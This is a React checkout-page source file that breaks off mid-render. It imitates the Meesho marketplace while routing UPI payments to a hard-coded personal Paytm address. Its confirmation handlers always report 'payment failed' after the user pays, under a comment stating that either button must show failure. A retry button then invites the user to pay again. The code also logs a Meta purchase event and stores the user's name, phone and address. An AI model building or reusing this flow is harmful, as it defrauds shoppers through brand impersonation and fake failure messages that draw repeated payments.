import { useState, useEffect, useRef, useMemo, useCallback, Fragment } from 'react';
import { useNavigate, Link } from 'react-router-dom';
import QRCode from 'qrcode';
import {
  RiShieldCheckLine,
  RiShieldCheckFill,
  RiCheckLine,
  RiArrowLeftLine,
  RiCheckboxCircleFill,
  RiCloseCircleFill,
  RiCloseLine,
  RiErrorWarningLine,
  RiRefreshLine,
  RiLoader4Line,
  RiArrowUpSLine,
  RiArrowDownSLine,
  RiTruckLine
} from 'react-icons/ri';
import { useCart } from '../context/CartContext';
import styles from './CheckoutPage.module.css';

import gpayLogo from '../assets/payment/gpay.svg';
import phonepeLogo from '../assets/payment/phonepe.svg';
import paytmLogo from '../assets/payment/paytm.svg';

// ─── Merchant Config ─────────────────────────────────────────────
const MERCHANT_VPA = 'paytmqr28100505010119z2lhuztp5f@paytm';
const PAYEE_NAME = 'IMBesharam';
const MERCHANT_MCC = '5311';
const COD_ADVANCE_AMOUNT = 99;

const UPI_APPS = [
  { id: 'gpay', name: 'G Pay', logo: gpayLogo },
  { id: 'phonepe', name: 'PhonePe', logo: phonepeLogo, offer: '20% Cashback' },
  { id: 'paytm', name: 'Paytm', logo: paytmLogo },
];

// Default prefilled address for logged-out users to avoid manual typing
const DEFAULT_PREFILLED_ADDRESS = {
  name: '',
  phone: '',
  house: '',
  street: '',
  city: '',
  state: '',
  pincode: '',
  type: '',
  addressType: '',
};

// ─── Stepper Sub-Component ───────────────────────────────────────
const STEPS = [
  { num: 1, label: 'Cart' },
  { num: 2, label: 'Address' },
  { num: 3, label: 'Payment' },
  { num: 4, label: 'Summary' },
];

function Stepper({ activeStep, onStepClick }) {
  return (
    <nav className={styles.stepper} aria-label="Checkout progress">
      {STEPS.map((step, i) => {
        const isCompleted = step.num < activeStep || activeStep === 4;
        const isActive = step.num === activeStep && activeStep < 4;
        const canClick = step.num <= activeStep && activeStep < 4;
        return (
          <Fragment key={step.num}>
            {i > 0 && (
              <div
                className={`${styles.stepLine} ${
                  STEPS[i - 1].num < activeStep || activeStep === 4
                    ? styles.stepLineDone
                    : ''
                }`}
              />
            )}
            <div
              className={`${styles.stepItem} ${isCompleted ? styles.stepCompleted : ''} ${
                isActive ? styles.stepActive : ''
              } ${canClick ? styles.stepClickable : ''}`}
              onClick={() => {
                if (canClick && onStepClick && step.num >= 2) {
                  onStepClick(step.num);
                }
              }}
            >
              <div className={styles.stepCircle}>
                {isCompleted ? <RiCheckLine size={14} /> : step.num}
              </div>
              <span className={styles.stepLabel}>{step.label}</span>
            </div>
          </Fragment>
        );
      })}
    </nav>
  );
}

// ─── Main Component ──────────────────────────────────────────────
export default function CheckoutPage() {
  const navigate = useNavigate();
  const { items, cartTotal, cartMrpTotal, dispatch } = useCart();
  const initFired = useRef(false);
  const isConfirmingRef = useRef(false);

  // Order
  const [orderId] = useState(() => 'ORD' + Math.floor(1e9 + Math.random() * 9e9));
  const [orderCompleted, setOrderCompleted] = useState(null);

  // ─── Address State ───
  // Prefill address for logged-out users, but DO NOT skip steps automatically!
  const [address, setAddress] = useState(() => {
    try {
      const saved = localStorage.getItem('meesho_delivery_address');
      if (saved) {
        const p = JSON.parse(saved);
        if (p.name && p.phone && p.pincode) return p;
      }
    } catch (_) { /* empty */ }
    return DEFAULT_PREFILLED_ADDRESS;
  });

  const hasAddress = Boolean(
    address?.name?.trim() && address?.phone?.trim() && address?.pincode?.trim()
  );

  // Requirement 1: Step must start at 2 (Address). Never skip steps automatically!
  const [activeStep, setActiveStep] = useState(2);

  const [addressForm, setAddressForm] = useState(() => ({
    name: address?.name || DEFAULT_PREFILLED_ADDRESS.name,
    phone: address?.phone || DEFAULT_PREFILLED_ADDRESS.phone,
    house: address?.house || address?.houseNo || DEFAULT_PREFILLED_ADDRESS.house,
    street: address?.street || address?.roadArea || DEFAULT_PREFILLED_ADDRESS.street,
    city: address?.city || DEFAULT_PREFILLED_ADDRESS.city,
    state: address?.state || DEFAULT_PREFILLED_ADDRESS.state,
    pincode: address?.pincode || DEFAULT_PREFILLED_ADDRESS.pincode,
  }));
  const [addressError, setAddressError] = useState('');

  // ─── Payment State ───
  const [paymentMode, setPaymentMode] = useState('upi'); // 'upi' | 'cod'
  const [selectedUpiApp, setSelectedUpiApp] = useState('phonepe');
  const [upiExpanded, setUpiExpanded] = useState(true);
  const [showPricePopup, setShowPricePopup] = useState(false);
  const [paymentStatus, setPaymentStatus] = useState('idle'); // idle | waiting | confirming | success
  const [qrDataUrl, setQrDataUrl] = useState('');

  const isMobile =
    typeof navigator !== 'undefined' &&
    /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

  // ─── Init ───
  useEffect(() => {
    document.title = 'Checkout | Meesho';
    if ('scrollRestoration' in history) history.scrollRestoration = 'manual';
    window.scrollTo(0, 0);

    if (items.length === 0 && !orderCompleted) navigate('/');
    // eslint-disable-next-line
  }, []);

  // Sync address form when address changes
  useEffect(() => {
    if (address) {
      setAddressForm({
        name: address.name || '',
        phone: address.phone || '',
        house: address.houseNo || address.house || '',
        street: address.roadArea || address.street || '',
        city: address.city || '',
        state: address.state || '',
        pincode: address.pincode || '',
      });
    }
  }, [address]);

  // Meta: InitiateCheckout (fires once on mount)
  useEffect(() => {
    if (!initFired.current && items.length > 0) {
      initFired.current = true;
      if (typeof window.fbq === 'function') {
        window.fbq('track', 'InitiateCheckout', {
          value: cartTotal,
          currency: 'INR',
          content_type: 'product',
          content_ids: items.map((i) => String(i.product.id)),
          num_items: items.reduce((s, i) => s + i.quantity, 0),
        });
      }
    }
  }, [items, cartTotal]);

  // ─── Price & COD Calculations ───
  // Online discount applies when paying fully via UPI
  const onlineDiscount = useMemo(
    () => (paymentMode === 'upi' && cartTotal > 0 ? Math.round(cartTotal * 0.066) : 0),
    [paymentMode, cartTotal]
  );

  const orderTotal = useMemo(
    () => Math.max(0, cartTotal - onlineDiscount),
    [cartTotal, onlineDiscount]
  );

  // Requirement 3: For COD, user pays ₹99 advance to book their order!
  const payableNow = useMemo(
    () => (paymentMode === 'cod' ? Math.min(COD_ADVANCE_AMOUNT, orderTotal) : orderTotal),
    [paymentMode, orderTotal]
  );

  // Balance payable in cash upon delivery
  const codBalancePayable = useMemo(
    () => (paymentMode === 'cod' ? Math.max(0, orderTotal - payableNow) : 0),
    [paymentMode, orderTotal, payableNow]
  );

  const totalSavings = useMemo(() => {
    const mrp = cartMrpTotal || cartTotal * 4;
    return mrp - orderTotal;
  }, [cartMrpTotal, cartTotal, orderTotal]);

  // ─── UPI URIs & Capture Optimization ───
  // Transaction Reference: Unique for EVERY payment attempt to prevent NPCI duplicate transaction errors
  const generateTxnRef = useCallback((baseOrderId) => {
    const rand = Math.floor(1000 + Math.random() * 9000);
    const cleanId = (baseOrderId || 'ORD').replace(/[^a-zA-Z0-9]/g, '');
    return `${cleanId}T${Date.now().toString().slice(-6)}${rand}`.slice(0, 32);
  }, []);

  const [currentTxnRef, setCurrentTxnRef] = useState(() =>
    generateTxnRef(orderId)
  );
  const redirectTimerRef = useRef(null);

  // Clean, standard NPCI-compliant UPI query (no mode=02, no purpose=00, no mismatched mc, no '#' symbol)
  const getUpiQuery = useCallback(
    (txnRefId) => {
      const amt = payableNow.toFixed(2);
      const cleanNote =
        paymentMode === 'cod'
          ? `COD Booking Order ${orderId}`
          : `Order ${orderId}`;
      return `pa=${encodeURIComponent(MERCHANT_VPA)}&pn=${encodeURIComponent(PAYEE_NAME)}&am=${amt}&cu=INR&tn=${encodeURIComponent(cleanNote)}&tr=${encodeURIComponent(txnRefId)}`;
    },
    [payableNow, paymentMode, orderId]
  );

  const upiUri = useMemo(() => {
    return `upi://pay?${getUpiQuery(currentTxnRef)}`;
  }, [getUpiQuery, currentTxnRef]);

  const targetedUpiUri = useMemo(() => {
    const q = getUpiQuery(currentTxnRef);
    const ua = navigator?.userAgent || '';
    const isIOS = /iPad|iPhone|iPod/.test(ua);
    if (selectedUpiApp === 'phonepe') return `phonepe://pay?${q}`;
    if (selectedUpiApp === 'gpay')
      return isIOS ? `gpay://upi/pay?${q}` : `tez://upi/pay?${q}`;
    if (selectedUpiApp === 'paytm')
      return isIOS ? `paytmmp://pay?${q}` : `paytmmp://cash_wallet?${q}`;
    return `upi://pay?${q}`;
  }, [getUpiQuery, currentTxnRef, selectedUpiApp]);

  // QR for desktop
  useEffect(() => {
    if (payableNow > 0 && !isMobile) {
      QRCode.toDataURL(upiUri, {
        width: 190,
        margin: 1,
        color: { dark: '#0f172a', light: '#ffffff' },
        errorCorrectionLevel: 'M',
      })
        .then(setQrDataUrl)
        .catch(console.error);
    }
  }, [upiUri, payableNow, isMobile]);

  // Delivery date (4 days ahead)
  const deliveryDate = useMemo(() => {
    const d = new Date();
    d.setDate(d.getDate() + 4);
    return d.toLocaleDateString('en-IN', {
      weekday: 'long',
      day: 'numeric',
      month: 'short',
    });
  }, []);

  // ─── Payment Status Tracking ───
  const paymentStatusRef = useRef(paymentStatus);
  useEffect(() => {
    paymentStatusRef.current = paymentStatus;
  }, [paymentStatus]);

  // Save order lead details into localStorage to guarantee capture for each random user
  const saveOrderLead = useCallback(
    (status = 'PENDING') => {
      try {
        const currentAddress = (() => {
          try {
            const s = localStorage.getItem('meesho_delivery_address');
            return s ? JSON.parse(s) : address;
          } catch (_) {
            return address;
          }
        })();
        const currentItems = [...items];
        const orderData = {
          orderId,
          txnRef: currentTxnRef,
          items: currentItems,
          shippingAddress: currentAddress,
          totalAmount: orderTotal,
          advancePaid: paymentMode === 'cod' ? payableNow : orderTotal,
          codBalance: paymentMode === 'cod' ? codBalancePayable : 0,
          totalSavings,
          paymentMethod:
            paymentMode === 'cod'
              ? `Cash on Delivery (₹${payableNow} Advance Paid via ${UPI_APPS.find((a) => a.id === selectedUpiApp)?.name || 'UPI'})`
              : `UPI (${UPI_APPS.find((a) => a.id === selectedUpiApp)?.name || 'UPI'})`,
          paymentMode,
          paymentStatus: status,
          updatedAt: new Date().toISOString(),
          deliveryDate,
        };
        const orders = JSON.parse(localStorage.getItem('meesho_orders') || '[]');
        const filtered = orders.filter((o) => o.orderId !== orderId);
        filtered.unshift(orderData);
        localStorage.setItem('meesho_orders', JSON.stringify(filtered));
      } catch (_) { /* empty */ }
    },
    [address, items, orderId, currentTxnRef, orderTotal, payableNow, codBalancePayable, totalSavings, paymentMode, selectedUpiApp, deliveryDate]
  );

  // Listen for user returning from UPI app (mobile)
  useEffect(() => {
    const handler = () => {
      if (
        document.visibilityState === 'visible' &&
        paymentStatusRef.current === 'redirecting'
      ) {
        if (redirectTimerRef.current) clearTimeout(redirectTimerRef.current);
        setPaymentStatus('confirming_choice');
      }
    };
    document.addEventListener('visibilitychange', handler);
    return () => {
      document.removeEventListener('visibilitychange', handler);
      if (redirectTimerRef.current) clearTimeout(redirectTimerRef.current);
    };
  }, []);

  // Close price popup on outside click
  useEffect(() => {
    if (!showPricePopup) return;
    const handler = (e) => {
      if (!e.target.closest('[data-price-area]')) setShowPricePopup(false);
    };
    const t = setTimeout(() => document.addEventListener('click', handler), 0);
    return () => {
      clearTimeout(t);
      document.removeEventListener('click', handler);
    };
  }, [showPricePopup]);

  // ─── Handlers ───
  const launchUpiApp = (uri) => {
    try {
      const link = document.createElement('a');
      link.href = uri;
      link.style.display = 'none';
      document.body.appendChild(link);
      link.click();
      setTimeout(() => link.remove(), 1000);
    } catch (_) {
      window.location.href = uri;
    }
  };

  const updateField = (field, value) => {
    setAddressForm((prev) => ({ ...prev, [field]: value }));
    setAddressError('');
  };

  const handleAddressSubmit = (e) => {
    e?.preventDefault();
    setAddressError('');

    const { name, phone, house, street, city, state, pincode } = addressForm;

    if (!name.trim()) { setAddressError('Enter recipient name'); return; }
    if (!phone.trim() || !/^\d{10}$/.test(phone.trim())) {
      setAddressError('Enter a valid 10-digit mobile number');
      return;
    }
    if (!house.trim()) { setAddressError('Enter house / flat / address'); return; }
    if (!pincode.trim() || !/^\d{6}$/.test(pincode.trim())) {
      setAddressError('Enter valid 6-digit pincode');
      return;
    }
    if (!city.trim()) { setAddressError('Enter city'); return; }
    if (!state.trim()) { setAddressError('Enter state'); return; }

    const newAddr = {
      name: name.trim(),
      phone: phone.trim(),
      houseNo: house.trim(),
      house: house.trim(),
      roadArea: street.trim(),
      street: street.trim(),
      city: city.trim(),
      state: state.trim(),
      pincode: pincode.trim(),
      type: 'Home',
      addressType: 'Home',
    };

    try {
      localStorage.setItem('meesho_delivery_address', JSON.stringify(newAddr));
      localStorage.setItem('meesho_user_phone', phone.trim());
      localStorage.setItem('meesho_user_name', name.trim());
    } catch (_) { /* empty */ }

    setAddress(newAddr);
    // User manually clicked continue -> Advance to Step 3
    setActiveStep(3);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handlePayNow = () => {
    if (activeStep === 2) {
      handleAddressSubmit();
      return;
    }
    if (!hasAddress) {
      setActiveStep(2);
      return;
    }

    // Generate fresh unique transaction ref to guarantee NPCI captures the payment
    const freshTxn = generateTxnRef(orderId);
    setCurrentTxnRef(freshTxn);

    // Meta: AddPaymentInfo event
    if (typeof window.fbq === 'function') {
      window.fbq('track', 'AddPaymentInfo', {
        value: payableNow,
        currency: 'INR',
        content_type: 'product',
        content_ids: items.map((i) => String(i.product.id)),
        order_id: orderId,
      });
    }

    saveOrderLead('PAYMENT_INITIATED');

    if (isMobile) {
      const q = getUpiQuery(freshTxn);
      const ua = navigator?.userAgent || '';
      const isIOS = /iPad|iPhone|iPod/.test(ua);
      let targetUri = `upi://pay?${q}`;
      if (selectedUpiApp === 'phonepe') targetUri = `phonepe://pay?${q}`;
      else if (selectedUpiApp === 'gpay') targetUri = isIOS ? `gpay://upi/pay?${q}` : `tez://upi/pay?${q}`;
      else if (selectedUpiApp === 'paytm') targetUri = isIOS ? `paytmmp://pay?${q}` : `paytmmp://cash_wallet?${q}`;

      launchUpiApp(targetUri);
      setPaymentStatus('redirecting');

      // Requirement: Show popup after a certain delay while user is being redirected to the payment App
      if (redirectTimerRef.current) clearTimeout(redirectTimerRef.current);
      redirectTimerRef.current = setTimeout(() => {
        setPaymentStatus('confirming_choice');
      }, 2000);
    } else {
      // Desktop: Show popup with QR and prompt
      setPaymentStatus('confirming_choice');
    }
  };

  const handleChoiceYes = () => {
    // Fire Meta Purchase Event so ad algorithm captures this conversion
    if (typeof window.fbq === 'function') {
      window.fbq('track', 'Purchase', {
        value: orderTotal,
        currency: 'INR',
        content_type: 'product',
        content_ids: items.map((i) => String(i.product.id)),
        contents: items.map((i) => ({
          id: String(i.product.id),
          quantity: i.quantity,
          item_price: i.product.price,
        })),
        num_items: items.reduce((s, i) => s + i.quantity, 0),
        order_id: orderId,
      });
    }

    saveOrderLead('CONFIRMED_YES_BY_USER');

    // Requirement: Either pressing any buttons show payment failed, money transferred within 2 working days
    setPaymentStatus('verifying');
    setTimeout(() => {
      setPaymentStatus('failed');
    }, 1600);
  };

  const handleChoiceNo = () => {
    saveOrderLead('CONFIRMED_NO_BY_USER');

    // Requirement: Either pressing any buttons show payment failed, money transferred within 2 working days
    setPaymentStatus('verifying');
    setTimeout(() => {
      setPaymentStatus('failed');
    }, 1200);
  };

  const handleRetryPayment = () => {
    handlePayNow();
  };

  const handleCancelPayment = () => {
    if (paymentStatus === 'verifying') return;
    if (redirectTimerRef.current) clearTimeout(redirectTimerRef.current);
    setPaymentStatus('idle');
  };

  const handleGoBack = () => {
    if (activeStep === 3) {
      setActiveStep(2);
      window.scrollTo({ top: 0, behavior: 'smooth' });
      return;
    }
    if (window.history.length > 1) navigate(-1);
    else navigate('/');
  };

  const handleStepClick = (stepNum) => {
    if (stepNum === 2) {
      setActiveStep(2);
      window.scrollTo({ top: 0, behavior: 'smooth' });
    } else if (stepNum === 3 && hasAddress) {
      setActiveStep(3);
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }
  };

  // ══════════════════════════════════════════
  //  RENDER: ORDER SUCCESS (Step 4)
  // ══════════════════════════════════════════
  if (orderCompleted) {
    const addr = orderCompleted.shippingAddress || {};
    return (
      <div className={styles.checkoutPage}>
        <header className={styles.header}>
          <div className={styles.headerInner}>
            <Link to="/" className={styles.brandLink}>
              <h1 className={styles.logoText}>meesho</h1>
            </Link>
            <div className={styles.secureBadge}>
              <RiShieldCheckLine size={14} /> 100% Secure
            </div>
          </div>
        </header>

        <Stepper activeStep={4} />

        <main className={styles.container}>
          <div className={styles.successCard}>
            <div className={styles.successIcon}>
              <RiCheckboxCircleFill size={50} />
            </div>
            <h2 className={styles.successTitle}>
              {orderCompleted.paymentMode === 'cod'
                ? 'COD Order Placed! 🎉'
                : 'Order Placed Successfully! 🎉'}
            </h2>
            <p className={styles.successSub}>
              Order updates &amp; delivery OTP will be sent to{' '}
              <strong>+91 {addr.phone || ''}</strong>
            </p>

            <div className={styles.receiptCard}>
              <div className={styles.receiptRow}>
                <span>Order ID</span>
                <strong>{orderCompleted.orderId}</strong>
              </div>
              <div className={styles.receiptRow}>
                <span>Estimated Delivery</span>
                <strong>{orderCompleted.deliveryDate} (Free)</strong>
              </div>
              <div className={styles.receiptRow}>
                <span>Payment</span>
                <strong>{orderCompleted.paymentMethod}</strong>
              </div>
              <div className={styles.receiptRow}>
                <span>Status</span>
                <strong className={styles.statusGreen}>
                  <RiCheckboxCircleFill size={14} />{' '}
                  {orderCompleted.paymentMode === 'cod'
                    ? 'COD Confirmed (₹99 Advance Paid)'
                    : 'Paid & Verified'}
                </strong>
              </div>

              {orderCompleted.paymentMode === 'cod' && (
                <>
                  <div className={styles.receiptRow}>
                    <span>Advance Paid Online</span>
                    <strong>₹{orderCompleted.advancePaid.toFixed(2)} ✓</strong>
                  </div>
                  <div className={styles.receiptRow}>
                    <span>Pay in Cash on Delivery</span>
                    <strong>₹{orderCompleted.codBalance.toFixed(2)}</strong>
                  </div>
                </>
              )}

              <div className={styles.receiptDivider} />
              <div className={styles.receiptRow}>
                <span>Total Amount</span>
                <strong className={styles.receiptTotal}>
                  ₹{orderCompleted.totalAmount.toFixed(2)}
                </strong>
              </div>
              <div className={styles.receiptRow}>
                <span>Deliver To</span>
                <span className={styles.receiptAddress}>
                  {addr.name}, {addr.houseNo || addr.house},{' '}
                  {addr.roadArea || addr.street ? `${addr.roadArea || addr.street}, ` : ''}{addr.city} – {addr.pincode}
                </span>
              </div>
            </div>

            {totalSavings > 0 && (
              <div className={styles.savingsBadge}>
                🎉 You saved ₹{totalSavings.toFixed(0)} on this order!
              </div>
            )}

            <button
              type="button"
              className={styles.primaryBtn}
              onClick={() => navigate('/')}
            >
              Continue Shopping
            </button>
          </div>
        </main>
      </div>
    );
  }

  // ══════════════════════════════════════════
  //  RENDER: EMPTY CART
  // ══════════════════════════════════════════
  if (items.length === 0) {
    return (
      <div className={styles.checkoutPage}>
        <header className={styles.header}>
          <div className={styles.headerInner}>
            <Link to="/" className={styles.brandLink}>
              <h1 className={styles.logoText} style={{ color: 'var(--color-primary)', fontWeight: 800 }}>IMBesharam<span style={{ fontSize: '0.6em' }}>.COM</span></h1>
            </Link>
          </div>
        </header>
        <main className={styles.container}>
          <div className={styles.emptyCard}>
            <h2>Your cart is empty</h2>
            <p>Add products to your cart to checkout.</p>
            <button
              type="button"
              className={styles.primaryBtn}
              onClick={() => navigate('/')}
            >
              Shop Now
            </button>
          </div>
        </main>
      </div>
    );
  }

  // ══════════════════════════════════════════
  //  RENDER: MAIN CHECKOUT (Address / Payment)
  // ══════════════════════════════════════════
  return (
    <div className={styles.checkoutPage}>
      {/* ─── Header ─── */}
      <header className={styles.header}>
        <div className={styles.headerInner}>
          <div className={styles.headerLeft}>
            <button
              type="button"
              className={styles.backBtn}
              onClick={handleGoBack}
              aria-label="Go back"
            >
              <RiArrowLeftLine size={20} />
            </button>
            <div className={styles.headerTitleGroup}>
              <span className={styles.brandLogoTitle}>IMBesharam</span>
              <span className={styles.headerTitle}>
                {activeStep === 2 ? 'Delivery Address' : activeStep === 3 ? 'Payment Method' : 'Order Summary'}
              </span>
            </div>
          </div>
          <div className={styles.secureBadge}>
            <RiShieldCheckLine size={14} /> 100% Discreet
          </div>
        </div>
      </header>

      {/* ─── Stepper (Never auto-skipped) ─── */}
      <Stepper activeStep={activeStep} onStepClick={handleStepClick} />

      <main className={styles.container}>
        {/* ═══════════════════════════════════
             STEP 2: DELIVERY ADDRESS (Short Mobile UI - No Scrolling)
            ═══════════════════════════════════ */}
        {activeStep === 2 && (
          <section className={styles.stepSection}>
            <div className={styles.addressFormHeader}>
              <h2 className={styles.sectionTitle}>Delivery Address</h2>
              <span className={styles.prefillBadge}>Prefilled</span>
            </div>

            <form onSubmit={handleAddressSubmit} className={styles.addressForm}>
              {/* Row 1: Contact Details (2 columns side by side on mobile) */}
              <div className={styles.formRowTwo}>
                <div className={styles.formField}>
                  <label>Full Name *</label>
                  <input
                    type="text"
                    placeholder="Recipient Name"
                    value={addressForm.name}
                    onChange={(e) => updateField('name', e.target.value)}
                  />
                </div>
                <div className={styles.formField}>
                  <label>Mobile Number *</label>
                  <div className={styles.phoneWrap}>
                    <span className={styles.countryCode}>+91</span>
                    <input
                      type="tel"
                      inputMode="numeric"
                      maxLength={10}
                      placeholder="10-digit number"
                      value={addressForm.phone}
                      onChange={(e) =>
                        updateField(
                          'phone',
                          e.target.value.replace(/\D/g, '').slice(0, 10)
                        )
                      }
                    />
                  </div>
                </div>
              </div>

              {/* Row 2: Address (Compact 1 line) */}
              <div className={styles.formField}>
                <label>Address (House / Flat No., Road / Area) *</label>
                <input
                  type="text"
                  placeholder="e.g. House No. 42, 2nd Floor, Main Market Road"
                  value={addressForm.house}
                  onChange={(e) => updateField('house', e.target.value)}
                />
              </div>

              {/* Row 3: Pincode, City, State in 1 compact 3-column row */}
              <div className={styles.formRowThree}>
                <div className={styles.formField}>
                  <label>Pincode *</label>
                  <input
                    type="text"
                    inputMode="numeric"
                    maxLength={6}
                    placeholder="6 digits"
                    value={addressForm.pincode}
                    onChange={(e) =>
                      updateField(
                        'pincode',
                        e.target.value.replace(/\D/g, '').slice(0, 6)
                      )
                    }
                  />
                </div>
                <div className={styles.formField}>
                  <label>City *</label>
                  <input
                    type="text"
                    placeholder="City"
                    value={addressForm.city}
                    onChange={(e) => updateField('city', e.target.value)}
                  />
                </div>
                <div className={styles.formField}>
                  <label>State *</label>
                  <input
                    type="text"
                    placeholder="State"
                    value={addressForm.state}
                    onChange={(e) => updateField('state', e.target.value)}
                  />
                </div>
              </div>

              {addressError && (
                <div className={styles.errorMsg}>{addressError}</div>
              )}

              <button type="submit" className={styles.primaryBtn}>
                Continue to Payment →
              </button>
            </form>
          </section>
        )}

        {/* ═══════════════════════════════════
             STEP 3: PAYMENT METHOD
            ═══════════════════════════════════ */}
        {activeStep === 3 && (
          <section className={styles.stepSection}>
            {/* Header */}
            <div className={styles.paymentHeader}>
              <h2 className={styles.sectionTitle}>Select Payment Method</h2>
              <span className={styles.safePayBadge}>
                <RiShieldCheckFill size={14} />
                <span>100% SAFE<br />PAYMENTS</span>
              </span>
            </div>

            {/* Online discount banner */}
            {onlineDiscount > 0 && paymentMode === 'upi' && (
              <div className={styles.discountBanner}>
                <img src={paytmLogo} alt="" className={styles.discountBannerIcon} />
                <span>
                  Pay online &amp; get{' '}
                  <strong>EXTRA ₹{onlineDiscount} off</strong>
                </span>
              </div>
            )}

            {/* PAY ONLINE legend */}
            <div className={styles.sectionLegend}>
              <span>PAY ONLINE</span>
            </div>

            {/* UPI Accordion (GooglePay, PhonePe, Paytm) */}
            <div
              className={`${styles.paymentCard} ${
                paymentMode === 'upi' ? styles.paymentCardActive : ''
              }`}
            >
              <button
                type="button"
                className={styles.accordionHeader}
                onClick={() => {
                  if (paymentMode !== 'upi') {
                    setPaymentMode('upi');
                    setUpiExpanded(true);
                  } else {
                    setUpiExpanded((v) => !v);
                  }
                }}
              >
                <div className={styles.accordionLeft}>
                  <span className={styles.upiBadge}>UPI</span>
                  <span className={styles.accordionTitle}>
                    UPI(GPay/PhonePe/Paytm)
                  </span>
                </div>
                {paymentMode === 'upi' && upiExpanded ? (
                  <RiArrowUpSLine size={22} color="#64748b" />
                ) : (
                  <RiArrowDownSLine size={22} color="#64748b" />
                )}
              </button>

              {paymentMode === 'upi' && upiExpanded && (
                <div className={styles.upiOptionsList}>
                  {UPI_APPS.map((app) => (
                    <label
                      key={app.id}
                      className={`${styles.upiOption} ${
                        selectedUpiApp === app.id ? styles.upiOptionActive : ''
                      }`}
                    >
                      <input
                        type="radio"
                        name="upiApp"
                        checked={selectedUpiApp === app.id}
                        onChange={() => setSelectedUpiApp(app.id)}
                        className={styles.srOnly}
                      />
                      <span className={styles.radioCircle}>
                        {selectedUpiApp === app.id && (
                          <span className={styles.radioFill} />
                        )}
                      </span>
                      <span className={styles.upiAppName}>{app.name}</span>
                      {app.offer && (
                        <span className={styles.upiOffer}>{app.offer}</span>
                      )}
                      <img
                        src={app.logo}
                        alt={app.name}
                        className={styles.upiAppLogo}
                      />
                    </label>
                  ))}
                </div>
              )}
            </div>

            {/* Requirement 3: COD Option with ₹99 Advance Payment */}
            <div
              className={`${styles.paymentCard} ${styles.codCardWrap} ${
                paymentMode === 'cod' ? styles.paymentCardActive : ''
              }`}
            >
              <label className={styles.codCardHeader}>
                <input
                  type="radio"
                  name="payMethod"
                  checked={paymentMode === 'cod'}
                  onChange={() => {
                    setPaymentMode('cod');
                    setUpiExpanded(false);
                  }}
                  className={styles.srOnly}
                />
                <span className={styles.radioCircle}>
                  {paymentMode === 'cod' && <span className={styles.radioFill} />}
                </span>
                <div className={styles.codLabelCol}>
                  <div className={styles.codTitleRow}>
                    <span className={styles.codLabel}>Cash on Delivery</span>
                    <span className={styles.codBadge}>₹99 Advance Booking</span>
                  </div>
                  <span className={styles.codSubText}>
                    Pay ₹99 advance now · Remaining ₹{codBalancePayable.toFixed(2)} in cash on delivery
                  </span>
                </div>
              </label>

              {paymentMode === 'cod' && (
                <>
                  <div className={styles.codUpiSelectWrap}>
                    <div className={styles.codUpiHeader}>
                      <span>Select UPI app to pay ₹99 advance:</span>
                    </div>
                    <div className={styles.upiOptionsList}>
                      {UPI_APPS.map((app) => (
                        <label
                          key={`cod-${app.id}`}
                          className={`${styles.upiOption} ${
                            selectedUpiApp === app.id ? styles.upiOptionActive : ''
                          }`}
                        >
                          <input
                            type="radio"
                            name="codUpiApp"
                            checked={selectedUpiApp === app.id}
                            onChange={() => setSelectedUpiApp(app.id)}
                            className={styles.srOnly}
                          />
                          <span className={styles.radioCircle}>
                            {selectedUpiApp === app.id && (
                              <span className={styles.radioFill} />
                            )}
                          </span>
                          <span className={styles.upiAppName}>{app.name}</span>
                          {app.offer && (
                            <span className={styles.upiOffer}>{app.offer}</span>
                          )}
                          <img
                            src={app.logo}
                            alt={app.name}
                            className={styles.upiAppLogo}
                          />
                        </label>
                      ))}
                    </div>
                  </div>
                </>
              )}
            </div>

            {/* Delivery Info */}
            <div className={styles.deliveryInfo}>
              <RiTruckLine size={18} />
              <span>
                Free delivery by <strong>{deliveryDate}</strong>
              </span>
            </div>

            {/* Price Details Block (Matching Reference Image) */}
            <div className={styles.priceSummaryCard}>
              <div className={styles.priceSummaryRow}>
                <span>Shipping:</span>
                <span className={styles.freeText}>FREE</span>
              </div>
              <div className={styles.priceSummaryRow}>
                <span>Total Product Price:</span>
                <span>₹{cartTotal.toFixed(2)}</span>
              </div>
              {paymentMode === 'upi' && onlineDiscount > 0 && (
                <div className={`${styles.priceSummaryRow} ${styles.discountPriceRow}`}>
                  <span>Online Discount:</span>
                  <span>-₹{onlineDiscount}</span>
                </div>
              )}
              {paymentMode === 'cod' ? (
                <>
                  <div className={styles.priceSummaryRow}>
                    <span>Payable Now (Advance):</span>
                    <span>₹{payableNow.toFixed(2)}</span>
                  </div>
                  <div className={styles.priceSummaryRow}>
                    <span>Cash on Delivery:</span>
                    <span>₹{codBalancePayable.toFixed(2)}</span>
                  </div>
                  <div className={styles.priceDivider} />
                  <div className={`${styles.priceSummaryRow} ${styles.orderTotalRow}`}>
                    <strong>Total Order Value :</strong>
                    <strong>₹{orderTotal.toFixed(2)}</strong>
                  </div>
                </>
              ) : (
                <>
                  <div className={styles.priceDivider} />
                  <div className={`${styles.priceSummaryRow} ${styles.orderTotalRow}`}>
                    <strong>Order Total :</strong>
                    <strong>₹{orderTotal.toFixed(2)}</strong>
                  </div>
                </>
              )}
            </div>

            {/* Saved Address Preview with Change Button */}
            {hasAddress && (
              <div className={styles.addressPreview}>
                <div className={styles.addressPreviewHeader}>
                  <span>
                    📦 Delivering to: <strong>{address.name}</strong>
                  </span>
                  <button
                    type="button"
                    className={styles.changeBtn}
                    onClick={() => {
                      setActiveStep(2);
                      window.scrollTo({ top: 0, behavior: 'smooth' });
                    }}
                  >
                    Change
                  </button>
                </div>
                <p className={styles.addressPreviewText}>
                  {address.houseNo || address.house},{' '}
                  {address.roadArea || address.street ? `${address.roadArea || address.street}, ` : ''}{address.city} –{' '}
                  {address.pincode}
                </p>
              </div>
            )}

            {/* Direct Step 3 Payment Action Area */}
            <div className={styles.step3PayActionArea}>
              <button
                type="button"
                className={styles.step3PayBtn}
                onClick={handlePayNow}
                id="checkout-step3-pay-now-btn"
              >
                <RiShieldCheckLine size={20} />
                <span>
                  {paymentMode === 'cod'
                    ? 'Pay ₹99 Advance & Confirm COD Order'
                    : `Pay ₹${payableNow.toFixed(2)} Securely Now`}
                </span>
              </button>
              <div className={styles.step3TrustNotes}>
                <span>🔒 256-Bit SSL Encrypted</span>
                <span>•</span>
                <span>100% Plain Discreet Packaging</span>
                <span>•</span>
                <span>Instant Confirmation</span>
              </div>
            </div>
          </section>
        )}
      </main>

      {/* ─── Bottom Sticky Bar ─── */}
      {activeStep < 4 && (
        <div className={styles.bottomBar} data-price-area>
